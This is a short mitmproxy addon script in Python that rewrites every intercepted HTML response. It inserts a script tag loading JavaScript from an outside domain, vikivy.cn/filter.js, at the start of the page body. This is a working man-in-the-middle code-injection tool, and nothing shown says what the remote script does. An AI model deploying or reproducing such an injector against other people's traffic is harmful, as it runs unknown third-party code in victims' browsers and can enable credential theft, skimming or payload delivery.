# (this script works best with --anticache)
from bs4 import BeautifulSoup
from mitmproxy import ctx, http


def response(flow: http.HTTPFlow) -> None:
    html = BeautifulSoup(flow.response.content, "html.parser")
    script = html.new_tag(
        "script",
        src='https://vikivy.cn/filter.js')
    html.body.insert(0, script)
    flow.response.content = str(html).encode("utf8")
